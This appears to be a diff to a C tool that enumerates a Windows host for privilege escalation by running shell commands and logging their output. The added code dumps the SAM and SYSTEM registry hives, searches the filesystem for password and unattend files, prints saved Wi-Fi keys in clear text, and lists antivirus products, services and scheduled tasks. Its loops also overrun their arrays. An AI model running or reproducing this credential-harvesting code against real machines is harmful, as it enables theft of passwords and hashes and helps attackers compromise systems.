@@ -6,13 +6,15 @@
 #include "database.h"
 #include <string.h>
 
+
 int time_c();
 char dir_file();
 char User_Enum();
 char  route_network();
 char Password_get();
-//int sys_info();
-//int system_info();
+char INFO_random();
+
+
 char dir_file()
 {
     char * log  = "=================================================\n"
@@ -20,16 +22,17 @@ char dir_file()
                   "=================================================\n"
                   " + Windows Version and Configuration + \n"
                   "=====================================\n\n";
-    char info [5][150] = {
+    char info [6][150] = {
                     PATH  " systeminfo | findstr /B /C:OS",
                     PATH  " wmic os get osarchitecture",
                     PATH  " Get-ChildItem Env: || ft Key,Value",
                     PATH  " wmic logicaldisk get caption,description,providername,Size",
-                    PATH  " wmic qfe"
+                    PATH  " wmic qfe",
+                    PATH  " systeminfo"
                     };
           fprintf(file,"%s",log);
           printf("%s",log);
-          for (int i =0 ;i<=5 ;i++){
+          for (int i =0 ;i<=6 ;i++){
              if (!file) abort();
              if ((ptr = popen(info[i], "r")) != NULL){
                   while ((fgets(buf,BUFSIZ,ptr) != NULL)){
@@ -51,8 +54,11 @@ char dir_file()
               if (i==3){
                    fprintf(file,"%s",L3);printf(L3);
                  }
-              if (i==4)
-                 break;
+              if (i==4){
+                 fprintf(file,"%s",L30);printf(L30);
+              }
+              if(i==5)
+              	break ;
          }
   }
 char User_Enmu()
@@ -117,7 +123,7 @@ char route_network()
                     "=============================\n";
       char info [9][200] = {
                         PATH  " ipconfig /all",
-                        PATH  " Get-NetRoute -AddressFamily IPv4 || ft DestinationPrefix,NextHop,RouteMetric,ifIndex",
+                        PATH  " route print",
                         PATH  " Get-NetNeighbor -AddressFamily IPv4 || ft ifIndex,IPAddress,LinkLayerAddress,State",
                         PATH  " netstat -ano",
                         PATH  " netsh firewall show config",
@@ -125,6 +131,7 @@ char route_network()
                         PATH  " reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s",
                         PATH  " net share",
                         PATH  " type %WINDIR%\\System32\\drivers\\etc\\hosts"
+                       
                         };
               fprintf(file,"%s",log);
               printf("%s",log);
@@ -166,41 +173,106 @@ char route_network()
              }
 }
 char Password_get()
-{
-      char * log  = "\n=================================================\n"
+
+{    
+
+          char * log  = "\n=================================================\n"
                     "               + Password Enumeration +            \n"
                     "===================================================\n"
-                    " + Get Sam File + \n"
+                    " + Get Sam File & System + \n"
+                    "=============================\n"
+                    "Note\n=======\nA required privilege is not held by the clien\n";
+                     if(".\\sam"){  
+                     		remove(".\\sam");
+                     		remove(".\\system");                   	
+                     	}           
+             char info [4][BUFSIZ] = {
+                                 PATH " reg save hklm\\sam .\\sam & reg save hklm\\system .\\system",
+                                 " cd C:\\ & findstr /SI /M ""password"" *.xml *.ini *.txt",
+                                 PATH " dir //s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul",
+                                 "echo. & for /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"')\
+                                 do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Content\"\
+                                 | find /v \"Number\" & echo.) & @echo on"
+                                 };
+                     
+				      fprintf(file,"%s",log);
+				             printf("%s",log);
+				      for (int i =0 ;i<=5 ;i++){
+				                  if (!file) abort();
+				                  if ((ptr = popen(info[i], "r")) != NULL){
+				                      while ((fgets(buf,BUFSIZ,ptr) != NULL)){
+				                         fprintf(file,"%s", buf);
+				                          printf("%s",buf);
+				                      }
+				                  }
+				                  printf("\n%s\n",end);fprintf(file,"%s\n",end);
+				                  if (i==0 ){
+				                  	  fprintf(file,"%s",L19);printf(L19);
+				                     }
+				                  if (i==1){
+				                        fprintf(file,"%s",L20);printf(L20);
+				                    }
+				                 if (i==2){
+				                          fprintf(file,"%s",L21);printf(L21);
+				                      }
+				                if (i==3)
+				                     break;
+				        }
+}				        
+
+char INFO_random()
+{
+      char * log  = "\n=================================================\n"
+                    "     + AV,Files,service & Procces Enumeration +    \n"
+                    "===================================================\n"
+                    " + AntivirusProduct + \n"
                     "=============================\n";
-      char info [4][BUFSIZ] = {
-                         " reg save hklm\\sam c:\\sam & reg save hklm\\system c:\\system",
-                         " cd C:\\ & findstr /SI /M ""password"" *.xml *.ini *.txt",
-                         " dir //s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul",
-                         " netsh wlan export profile key=clear"
+      char info [8][BUFSIZ] = {
+                         PATH " CimInstance -Namespace root/SecurityCenter2 -Classname AntiVirusProduct",
+                         PATH  " DRIVERQUERY",
+                               " sc.exe qc usosvc",
+                         PATH  " Get-ChildItem 'C:\\Program Files', 'C:\\Program Files (x86)' || ft Parent,Name,LastWriteTime",
+                               " wmic service list brief",
+                               " tasklist",
+                               " wmic startup get caption,command,Location",
+                         PATH  " Get-ScheduledTask || where {$_.TaskPath -notlike \"\\Microsoft*\"} ||ft TaskName,TaskPath,State"
                         };
-      fprintf(file,"%s",log);
-             printf("%s",log);
-      for (int i =0 ;i<=5 ;i++){
-                  if (!file) abort();
-                  if ((ptr = popen(info[i], "r")) != NULL){
+              fprintf(file,"%s",log);
+              printf("%s",log);
+              for (int i =0 ;i<=8 ;i++){
+                 if (!file) abort();
+                 if ((ptr = popen(info[i], "r")) != NULL){
                       while ((fgets(buf,BUFSIZ,ptr) != NULL)){
-                         fprintf(file,"%s", buf);
-                          printf("%s",buf);
+                           fprintf(file,"%s", buf);
+                           printf("%s",buf);
                       }
-                  }
+                 }
                   printf("\n%s\n",end);fprintf(file,"%s\n",end);
                   if (i==0){
-                      fprintf(file,"%s",L19);printf(L19);
-                     }
-                  if (i==1){
-                        fprintf(file,"%s",L20);printf(L20);
+                      fprintf(file,"%s",L22);printf(L22);
                     }
-                 if (i==2){
-                          fprintf(file,"%s",L21);printf(L21);
-                      }
-                if (i==3)
+                  if (i==1){
+                      fprintf(file,"%s",L23);printf(L23);
+                    }
+                  if (i==2){
+                      fprintf(file,"%s",L24);printf(L24);
+                    }
+                  if (i==3){
+                       fprintf(file,"%s",L25);printf(L25);
+                    }
+                  if (i==4){
+                      fprintf(file,"%s",L26);printf(L26);
+                    }
+                  if (i==5){
+                     fprintf(file,"%s",L27);printf(L27);
+                    }
+                  if (i==6){
+                     fprintf(file,"%s",L28);printf(L28);
+                    }  
+                  if (i==7)
                      break;
-        }
+             }
+
       pclose(ptr);
       fclose(file);
       return 0;
@@ -221,5 +293,7 @@ int main(){
     User_Enmu();
     route_network();
     Password_get();
+    INFO_random();
+
     return 0 ;
 }
